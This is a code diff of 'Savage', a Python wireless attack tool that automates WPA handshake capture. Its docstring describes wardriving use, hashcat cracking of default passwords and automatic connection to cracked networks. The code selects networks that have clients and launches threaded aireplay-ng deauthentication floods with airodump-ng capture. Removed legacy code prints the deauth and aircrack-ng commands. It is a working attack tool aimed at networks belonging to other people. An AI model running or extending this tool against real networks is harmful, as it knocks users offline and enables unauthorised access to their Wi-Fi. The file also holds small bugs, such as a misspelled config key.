@@ -1,6 +1,8 @@
 """
 
     Savage
+    Version 0.02
+    August 17th, 2018
     
     author:  Joe "Cas" Casanova (joecasanova@gmail.com)
     
@@ -12,7 +14,14 @@
     Savage aims to automate handshake collection by looking at SSIDs that have
     clients connected, have a signal strength that is ideal or better, and has
     an SSID that indicates that it may also still have the default password set.
+        -Still need to:
+            -Develop signal power logic for deciding ideal targets
+            -Develop database of known weak default PSK schemas
 
+    Handshake collection can be tweaked to be ideal for wardriving WPA capture
+    by reducing the attack timeout and flush time periods to low values.
+
+    *NOT YET IMPLEMENTED*
     Once the handshake is collected, the tool uses hashcat to run a dictionary
     attack against the captured handshake using a custom-crafted dictionary
     that contains all of the possible passwords for that SSID's default 
@@ -24,25 +33,32 @@
     default PSK still set, it *WILL* find the PSK that is set in a reasonable
     amount of time.
     
+    *NOT YET IMPLEMENTED*
     Once the PSK is found for a SSID within range of the computer running
     Savage... savage then instructs Network Manager to connect to the SSID.
     
+    *NOT YET IMPLEMENTED*
     Savage will continue to capture handshakes during this entire process and
     will "ABC" (or Always Be Cracking)... meaning it will be running a crackjob
     using hashcat that is the most probable to be successful in the shortest
-    amount of time that it hasn't already run to completion.
+    amount of time that it hasn't already run to completion.  Savage will run
+    hashing jobs in the order of most probable to crack to least probable.
     
     Savage keeps track of what SSIDs it has captured and what crackjobs it has
     run to completion between sessions.  In order to remove this progress, 
     simply delete the associated .cap files for handshakes or .job files
     for completed crackjobs as it uses the existence of these files to keep
     track of its progress.
+        -Still need to:
+            -Build cracking functionality.
     
     
     ACKNOWLEDGEMENTS AND THANKS    
 
     A huge round of gratitude goes to Derv Merkler and the wifite team for much
-    inspiration and code referencing of your wonderful tool!
+    inspiration and code referencing of your wonderful tool!  Savage does
+    borrow a lot of code from wifite.  I am a big fan of not reinventing the
+    wheel.
     
     wifite
 
@@ -61,8 +77,12 @@
         - Build out Client and Target data interpretation for HS target selection
         - Add logical analysis to determine best probable capture targets
         - Integrate a database of known default PSK/SSID schemas
+        - Add logic to identify SSIDs that probably have default schema PSKs set
+            using above database.
         - Benchmarking for hashcat to determine Time-to-crack estimates
         - fix whitelisting
+        - Add capability to manipulate network manager to connect computer to
+            cracked SSIDs
 """
 
 from threading import Thread #threading, duh!
@@ -94,7 +114,7 @@ CONFIG={"configPath":"/usr/share/savage/savage.conf",\
     "maxJobs":8,\
     "lastJob":0,\
     "shutdown":False,\
-    "whitelist":["54:13:79:89:7a:27"]}
+    "whitelist":[]}
 
 def scan():
     ##########################################################################
@@ -153,10 +173,9 @@ def scan():
         # self.power = power - Client's power in negative dB - higher number is better
         ######################################################################
         os.system('clear')
-        
-        vulnTargets = []
-        
+        #print "Whitelist: " + str(CONFIG["whitelist"])
         #Start looking at the data and outputting some stats
+        vulnTargets = []
         if len(targets) > 0:
             header = "APs Detected: " + str(len(targets)) +\
                 " - Clients Detected: " + str(len(clients)) +\
@@ -166,40 +185,10 @@ def scan():
                     sec_to_hms(seconds_running-last_flush)+ "/" +\
                     sec_to_hms(CONFIG["flushTime"] + last_flush - seconds_running)
             print header + "\nBSSID\t\t\tSSID\t\t\t\tPower\tData\t"+\
-                "Encryption\tClients\tCaptured"
-            for target in targets:
-                captured = False
-                for x in range(0,len(CONFIG["whitelist"])-1):
-                    if target.bssid == CONFIG["whitelist"][x]:
-                        captured = True
-                if os.path.exists(CONFIG["handshakePath"] + '/' +\
-                target.ssid + '-' + target.bssid + '.cap'):
-                        captured = True
-                if target.encryption.find("WPA") == -1: #Ignore non-WPA APs
-                    continue
-                line = target.bssid + "\t" + target.ssid + "\t"
-                if len(target.ssid) < 24:
-                    line = line + "\t"
-                if len(target.ssid) < 18:
-                    line = line + "\t"
-                if len(target.ssid) < 8:
-                    line = line + "\t"
-                line = line + str(target.power) + "\t" + target.data + "\t" +\
-                    target.encryption
-                connectedClients = 0
-                for client in clients:
-                    skip_client = False
-                    for x in range(0,len(CONFIG["whitelist"])-1):
-                        if client.bssid == CONFIG["whitelist"][x]:
-                            skip_client = True
-                    if client.station == target.bssid and skip_client == False:
-                        connectedClients = connectedClients + 1
-                        if target.encryption.find("WPA") != -1 and captured == False:
-                            vulnTargets.append((target,client,captured))
-                line = line + "\t\t" + str(connectedClients) + "\t" + str(captured)
-                print line
-
-        #Client output is disabled because it gets... very large
+                "Encryption\tClients\tCaptured"        
+            vulnTargets = get_targets(targets, clients)
+        
+        #Client output is disabled because it gets... very large in most cases
         if len(clients) > 0:
             #print "\nBSSID\t\t\tStation\t\t\t\tPower\tSSID"
             for client in clients:
@@ -210,41 +199,10 @@ def scan():
                         line = line + target.ssid
                 
         #Now we output the list of APs that have WPA encryption and clients
-        targetData = []
-        if len(vulnTargets) > 0:
-            print "\nTarget Pairs: " + str(len(vulnTargets))
-            print "SSID\t\t\tBSSID\t\t\tClient\t\t\tAP Power\tClient Power"
-            for pair in vulnTargets:
-                target = pair[0]
-                client = pair[1]
-                if pair[2] == True: continue #Don't list captured AP HSs as targets
-                exists = False
-                for x in range(0,len(targetData)):
-                    if targetData[x]["ap"].bssid == target.bssid:
-                        exists = True
-                        targetData[x]["clients"].append(client)
-                        break
-                if exists == False:
-                    captured = False
-                    if os.path.exists(CONFIG["handshakePath"] + '/' +\
-                target.ssid + '-' + target.bssid + '.cap'):
-                        captured = True
-                    targetData.append({"ap":target,"clients":[client],\
-                    "captured":captured})
-                line = target.ssid
-                if len(target.ssid) < 24:
-                    line = line + "\t"
-                if len(target.ssid) < 18:
-                    line = line + "\t"
-                if len(target.ssid) < 8:
-                    line = line + "\t"
-                line = line + target.bssid + "\t" +\
-                    client.bssid + "\t" + str(target.power) + "\t\t" +\
-                    str(client.power)
-                print line
+        targetData = get_target_list(vulnTargets)
         #print str(targetData)
         print "\nTotal Captured Handshakes this session: " +\
-            str(CONFIG["capturedSession"]) + "\n\nWetwork Job Queue: "+\
+            str(CONFIG["capturedSession"]) + "\n\nOngoing Wetwork: "+\
             "\nJobID\tType\tTime\tBSSID\t\t\tSSID"
         jobs = CONFIG["currentJobs"]
         for a in jobs["jobList"]:
@@ -262,8 +220,6 @@ def scan():
         if len(CONFIG["currentJobs"]["jobList"]) < CONFIG["maxJobs"]:
             for a in targetData:
                 skip = False
-                if a["ap"].ssid == "RHHT" or a["ap"].bssid == "C0:3F:0E:54:2E:44":
-                    skip = True
                 #print CONFIG["currentJobs"]
                 curJobs = CONFIG["currentJobs"]
                 for b in CONFIG["currentJobs"]["jobList"]:
@@ -271,8 +227,7 @@ def scan():
                         skip = True
                     #First check to see if a handshake exists for the current target
                 if not os.path.exists(CONFIG["handshakePath"] + '/' +\
-                    a["ap"].ssid + '-' + a["ap"].bssid + '.cap') and skip == False\
-                     and a["ap"].ssid != "RHHT":
+                    a["ap"].ssid + '-' + a["ap"].bssid + '.cap') and skip == False:
                         #add a list item to CONFIG["currentJobs"]
                         deauthJob = {"type":"Deauth",\
                         "AP":a["ap"],\
@@ -286,11 +241,6 @@ def scan():
                         str(deauthJob["timeRemain"]) + "\t" +\
                         deauthJob["AP"].bssid + "\t" +\
                         deauthJob["AP"].ssid
-                        #threaded_handshake_capture(jobID)
-                        #CONFIG["currentJobs"][jobID]["thread"] =\
-                            #Thread(target=threaded_handshake_capture, args=(jobID))
-                        #CONFIG["currentJobs"][jobID]["thread"].start()
-                        #time.sleep(30)
                         t = Thread(target=threaded_handshake_capture,\
                             args = (jobID, 1))
                         t.start()
@@ -393,78 +343,92 @@ def threaded_handshake_capture(jobID, junk):
     send_interrupt(proc_read)
     remove_airodump_files(filename)
     return
-
-
-def get_handshake(targetData):
+    
+def get_target_list(vulnTargets):
 
     ##########################################################################
-    # Does our wetwork by deauthing clients attached to passed AP
-    # and attempting to capture the handshake (do our wetwork)
-    # targetData is a dictionary:
-    #   targetData["AP"] is a target class
-    #   targetData]"clients"] is a list of client classes
-    #
-    # This function is legacy code and not used anymore.
-    # Superceded by threaded_handshake_capture
+    # Generates target pair data and filters out any that have already been
+    # captured.  This can probably be folded into get_targets() due to similiar
+    # functionality.
     ##########################################################################
-    start_time = time.time()
-    seconds_running = 0
-    got_handshake = False
-    while seconds_running <= CONFIG["attackTimeout"] and got_handshake == False:
-        seconds_running = int(time.time() - start_time)
-        for client in targetData["clients"]:
-            print "Deauthing " + client.bssid + " connected to " +\
-                targetData["ap"].ssid + " [" + targetData["ap"].bssid + "]\n"+\
-                "\tTime Elapsed: " + str(seconds_running) + "/" +\
-                str(CONFIG["attackTimeout"]) + " seconds."
-            
-            try:
-                filename = CONFIG["tempPath"] + "/wpa-" +\
-                targetData["ap"].bssid + "-"
-                remove_airodump_files(filename) #remove any old .cap files for this ap
-                # Start airodump-ng process to capture handshakes
-                cmd = ['airodump-ng',
-                       '-w', filename,
-                       '-c', targetData["ap"].channel,
-                       '--write-interval', '1',
-                       '--bssid', targetData["ap"].bssid,
-                       CONFIG["captureInterface"]]
-                proc_read = Popen(cmd, stdout=open(os.devnull, 'w'),\
-                    stderr=open(os.devnull, 'w'))
-                cmd = ['aireplay-ng',
-                       '--ignore-negative-one',
-                       '-0',  # Attack method (Deauthentication)
-                       str(5),  # Number of packets to send
-                       '-a', targetData["ap"].bssid,'-h',client.bssid,\
-                       CONFIG["captureInterface"]]
-                proc_deauth = Popen(cmd, stdout=open(os.devnull, 'w'),\
-                    stderr=open(os.devnull, 'w'))
-                proc_deauth.wait()
-                if not os.path.exists(CONFIG["tempPath"] + 'wpa-01.cap'): continue
-                copy(CONFIG["tempPath"] + 'wpa-01.cap',\
-                    CONFIG["tempPath"] + 'wpa-01.cap.temp')
-                crack = 'echo "" | aircrack-ng -a 2 -w - -b ' +\
-                    targetData["ap"].bssid +\
-                    ' ' + CONFIG["tempPath"] + "/wpa-01.cap.temp"
-                proc_crack = Popen(crack, stdout=PIPE,\
-                stderr=open(os.devnull, 'w'), shell=True)
-                proc_crack.wait()
-                txt = proc_crack.communicate()[0]
 
-                got_handshake = txt.find('Passphrase not in dictionary') != -1
-                if got_handshake:
-                    send_interrupt(proc_read)
-                    send_interrupt(proc_deauth)
-                    newfilename = CONFIG["handshakePath"] + '/' + targetData["ap"].ssid +\
-                    '-' + targetData["ap"].bssid + '.cap'
-                    rename(CONFIG["tempPath"] + 'wpa-01.cap.temp', newfilename)
-                    print "Handshake captured for " + targetData["ap"].ssid +\
-                    "\nSaved as " + newfilename
-                    CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
-                
-            except KeyboardInterrupt:
-                return True #Tells scan() we were told to stop scanning
-    return False
+        targetData = []
+        if len(vulnTargets) > 0:
+            print "\nTarget Pairs: " + str(len(vulnTargets))
+            print "SSID\t\t\tBSSID\t\t\tClient\t\t\tAP Power\tClient Power"
+            for pair in vulnTargets:
+                target = pair[0]
+                client = pair[1]
+                if pair[2] == True: continue #Don't list captured AP HSs as targets
+                exists = False
+                for x in range(0,len(targetData)):
+                    if targetData[x]["ap"].bssid == target.bssid:
+                        exists = True
+                        targetData[x]["clients"].append(client)
+                        break
+                if exists == False:
+                    captured = False
+                    if os.path.exists(CONFIG["handshakePath"] + '/' +\
+                target.ssid + '-' + target.bssid + '.cap'):
+                        captured = True
+                    targetData.append({"ap":target,"clients":[client],\
+                    "captured":captured})
+                line = target.ssid
+                if len(target.ssid) < 24:
+                    line = line + "\t"
+                if len(target.ssid) < 18:
+                    line = line + "\t"
+                if len(target.ssid) < 8:
+                    line = line + "\t"
+                line = line + target.bssid + "\t" +\
+                    client.bssid + "\t" + str(target.power) + "\t\t" +\
+                    str(client.power)
+                print line
+        return targetData
+
+def get_targets(targets, clients):
+    
+    ##########################################################################
+    # Takes in target and client objects that contain observed APs and clients
+    # Determines which are connected and paired together and returns a list
+    # of dictionaries that contains the AP data and the associated clients
+    # filters out whitelisted MAC addresses    
+    ##########################################################################
+
+    vulnTargets = []
+    for target in targets:
+        captured = False
+        whitelist = False
+        for x in range(0,len(CONFIG["whitelist"])):
+            if target.bssid == CONFIG["whitelist"][x]:
+                whitelist = True
+        if os.path.exists(CONFIG["handshakePath"] + '/' +\
+        target.ssid + '-' + target.bssid + '.cap'):
+                captured = True
+        if target.encryption.find("WPA") == -1 or whitelist == True: #Ignore non-WPA APs
+            continue
+        line = target.bssid + "\t" + target.ssid + "\t"
+        if len(target.ssid) < 24:
+            line = line + "\t"
+        if len(target.ssid) < 18:
+            line = line + "\t"
+        if len(target.ssid) < 8:
+            line = line + "\t"
+        line = line + str(target.power) + "\t" + target.data + "\t" +\
+            target.encryption
+        connectedClients = 0
+        for client in clients:
+            skip_client = False
+            for x in range(0,len(CONFIG["whitelist"])-1):
+                if client.bssid == CONFIG["whitelist"][x]:
+                    skip_client = True
+            if client.station == target.bssid and skip_client == False:
+                connectedClients = connectedClients + 1
+                if target.encryption.find("WPA") != -1 and captured == False:
+                    vulnTargets.append((target,client,captured))
+        line = line + "\t\t" + str(connectedClients) + "\t" + str(captured)
+        print line
+    return vulnTargets
     
 def parse_csv(filename):
     ##########################################################################
@@ -628,51 +592,64 @@ def main():
     if not program_exists('airmon-ng'):
         print "airmon-ng is not installed!  Program exiting!"    
         exit(1)
-    #standardize the whitelist MAC address list to all uppercase    
-    for x in range(0,len(CONFIG["whitelist"])-1):
-        CONFIG["whitelist"][x] = CONFIG["whitelist"][x].upper()
+
         
     #capture arguments passed
     parser = optparse.OptionParser('Usage: python savage.py -i <CaptureInterface> <options>'+\
         "\nFor additional information run 'python savage.py -h'")
-    parser.add_option('-i', dest='captureInterface', type='string',\
-        help='Sets a wireless interface to use for handshake capture')
-    parser.add_option('-c', dest='configPath', type='string',\
-        help='Sets path and filename to use as a configuration')
-    parser.add_option('-w', dest='handshakePath', type='string',\
-        help='Sets path to WPA handshake capture directory.  '+\
-        'DEFAULT: ' + CONFIG["handshakePath"])
-    parser.add_option('-d', dest='dictPath', type='string',\
-        help='Sets path to use for storage of dictionary files.  '+\
-        'DEFAULT: ' + CONFIG["dictPath"])
-    parser.add_option('-n', dest='connectInterface', type='string',\
-        help='Sets wireless interface to control with Network Manager.  '+\
-        'NOTE:  A second wireless NIC is ideal so that one can continue'+\
-        ' to collect handshakes while the second can be used to connect.'+\
-        '  The wireless NIC being used for handshake capture must be in monitor'+\
-        ' mode in order to successfully capture handshakes.')
-    parser.add_option('-k', dest='keyfilePath', type='string',\
-        help='Sets path for keyfile directory.  '+\
-        'DEFAULT: ' + CONFIG["keyfilePath"])
-    parser.add_option('-j', dest='jobPath', type='string',\
-        help='Sets path for jobfile directory.  '+\
-        'DEFAULT: ' + CONFIG["jobPath"])
+        
     parser.add_option('-a', dest='attackTimeout', type = 'int',\
         help = 'Sets deauth attack timeout in seconds.  ' +\
         'This is how long to spend attempting to deauth each client. ' +\
         'DEFAULT: ' + str(CONFIG["attackTimeout"]))
+    parser.add_option('-c', dest='configPath', type='string',\
+        help='Sets path and filename to use as a configuration')
+    parser.add_option('--create-dirs', dest='createDirs', action='store_true',\
+        default = False, help = 'Creates any paths that do not exist.  '+
+        'DEFAULT:  False')        
+    parser.add_option('-d', dest='dictPath', type='string',\
+        help='Sets path to use for storage of dictionary files.  '+\
+        'DEFAULT: ' + CONFIG["dictPath"])
     parser.add_option('-f', dest='flushTime', type = 'int',\
         help = 'Sets period in second to flush scan data and start fresh.  '+\
         'Set to low value if scanning on the move or high value if stationary.  '+\
         'Set to 0 to disable scan data flush.  '+\
         'DEFAULT: ' + str(CONFIG["flushTime"]))
+    parser.add_option('-i', dest='captureInterface', type='string',\
+        help='Sets a wireless interface to use for handshake capture')
+    parser.add_option('-j', dest='jobPath', type='string',\
+        help='Sets path for jobfile directory.  '+\
+        'DEFAULT: ' + CONFIG["jobPath"])
+    parser.add_option('-k', dest='keyfilePath', type='string',\
+        help='Sets path for keyfile directory.  '+\
+        'DEFAULT: ' + CONFIG["keyfilePath"])
+    parser.add_option('-m', dest='maxJobs', type = 'int',\
+        help = 'Sets the maximum amount of deauth jobs that can be run at once.  '+\
+        'DEFAULT: ' + str(CONFIG["maxJobs"]))
+    parser.add_option('-n', dest='connectInterface', type='string',\
+        help='Sets wireless interface to control with Network Manager.  '+\
+        'NOTE:  A second wireless NIC is ideal so that one can continue'+\
+        ' to collect handshakes while the second can be used to connect.'+\
+        '  The wireless NIC being used for handshake capture must be in monitor'+\
+        ' mode in order to successfully capture handshakes.')        
+    parser.add_option('-s', dest='handshakePath', type='string',\
+        help='Sets path to WPA handshake capture directory.  '+\
+        'DEFAULT: ' + CONFIG["handshakePath"])
+    parser.add_option('-t', dest='tempPath', type = 'string',\
+        help = 'Sets the path for temporary files.  Temporary files are'+\
+        'cleaned up after and during each run of the program.  '+\
+        'DEFAULT: ' + CONFIG["tempPath"])
+    parser.add_option('-w', dest='whiteList', type='string',\
+        help='Comma deliminated list of MAC addresses to white list.  '+\
+        'Any MAC address will not be attacked or deauthed.  Clients or APs '+\
+        'can be specified.  NOTE:  Invalid MAC addresses are ignored')
         
     (options, args) = parser.parse_args()
     
     CONFIG["currentJobs"] = {"jobList":[]}
     
     if options.captureInterface == None:
-        print "A capture interface must be specified at the very least!"
+        print "A capture interface is required!!"
         print parser.usage
         exit(0)
     else:
@@ -691,22 +668,36 @@ def main():
         CONFIG["keyfilePath"] = options.keyfilePath
     if options.jobPath != None:
         CONFIG["jobPath"] = options.jobPath
-    if options.jobPath != None:
+    if options.attackTimeout != None:
         CONFIG["attackTimeout"] = options.attackTimeout
     if options.flushTime !=None:
         CONFIG["flushTime"] = options.flushTime
+    if options.maxJobs != None:
+        CONFIG["maxJobs"] = options.maxJobs
+    if options.tempPath != None:
+        CONFIG["tempPath"] = options.tempPath
+    if options.whiteList != None:
+        #Whitelist is not empty so we turn the string into a list
+        #Also clean it up and either add colons every two spaces or replace
+        #hyphens with commas
+        tempList = options.whiteList.replace("-",":").split(",")
+        for x in tempList:
+            if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower()):
+                if len(x) == 12:
+                    #MAC doesn't have colons... so we add them!
+                    z = ""
+                    for y in range(0,11,2):
+                        z = z + x[y:y+2] + ":"
+                    CONFIG["whitelist"].append(z[:17].upper())
+                else:
+                    CONFIG["whitelist"].append(x.upper())
+        time.sleep(5)
+
+    CONFIG["createDirs"] = options.createDirs
+    #Check working paths - if CONFIG["createDirs"] is true then they are created
+    check_path_dirs()
+
         
-    #Some debug output that will be removed at a later time
-    """
-    print "[+] Capture Interface: " + CONFIG["captureInterface"]
-    print "[+] Configuration Path: " + CONFIG["configPath"]
-    print "[+] Handshake Path: " + CONFIG["handshakePath"]
-    print "[+] Dictionary Path: " + CONFIG["dictPath"]
-    print "[+] Connection Interface: " + CONFIG["connectInterface"]
-    print "[+] Keyfile Path: " + CONFIG["keyfilePath"]
-    print "[+] Job Path: " + CONFIG["jobPath"]
-    print "[+] Attack Timeout: " + str(CONFIG["attackTimeout"])
-    """
     #put the capture interface into monitor mode
     CONFIG["captureInterface"] = enable_monitor_mode(CONFIG["captureInterface"])
     
@@ -723,6 +714,76 @@ def main():
     #finally exit... probably not needed but I have OCD so let's do it anyway.
     exit(0)
     
+def check_path_dirs():
+    ##########################################################################
+    # Checks all directories for all paths in CONFIG
+    # If CONFIG["createDirs"] is false then we exit if any do not exist
+    # If CONFIG["createDirs"] is true then we create them and continue
+    ##########################################################################
+    
+    if CONFIG["createDirs"] == False:
+        if not os.path.exists(CONFIG["handshakePath"]):
+            print "[!] " + CONFIG["handshakePath"] + " does not exist!  Exiting!"
+            print "[!] pass --create-dirs to force directory creation!"
+            exit(0)
+
+        if not os.path.exists(CONFIG["dictPath"]):
+            print "[!] " + CONFIG["dictPath"] + " does not exist!  Exiting!"
+            print "[!] pass --create-dirs to force directory creation!"
+            exit(0)
+
+        if not os.path.exists(CONFIG["keyfilePath"]):
+            print "[!] " + CONFIG["keyfilePath"] + " does not exist!  Exiting!"
+            print "[!] pass --create-dirs to force directory creation!"
+            exit(0)
+
+        if not os.path.exists(CONFIG["jobPath"]):
+            print "[!] " + CONFIG["jobPathh"] + " does not exist!  Exiting!"
+            print "[!] pass --create-dirs to force directory creation!"
+            exit(0)
+
+        if not os.path.exists(CONFIG["tempPath"]):
+            print "[!] " + CONFIG["tempPath"] + " does not exist!  Exiting!"
+            print "[!] pass --create-dirs to force directory creation!"
+            exit(0)
+        
+    else:        
+
+        if not os.path.exists(CONFIG["handshakePath"]):
+            try:
+                os.makedirs(CONFIG["handshakePath"])
+            except:
+                print "[!] Could not create " + CONFIG["handshakePath"]
+                exit(0)
+
+        if not os.path.exists(CONFIG["dictPath"]):
+            try:
+                os.makedirs(CONFIG["dictPath"])
+            except:
+                print "[!] Could not create " + CONFIG["dictPath"]
+                exit(0)
+
+        if not os.path.exists(CONFIG["keyfilePath"]):
+            try:
+                os.makedirs(CONFIG["keyfilePath"])
+            except:
+                print "[!] Could not create " + CONFIG["keyfilePath"]
+                exit(0)
+
+        if not os.path.exists(CONFIG["jobPath"]):
+            try:
+                os.makedirs(CONFIG["jobPath"])
+            except:
+                print "[!] Could not create " + CONFIG["jobPath"]
+                exit(0)
+
+        if not os.path.exists(CONFIG["tempPath"]):
+            try:
+                os.makedirs(CONFIG["tempPath"])                
+            except:
+                print "[!] Could not create " + CONFIG["tempPath"]
+                exit(0)
+            
 class Target:
     """
         Holds data for a Target (aka Access Point aka Router)
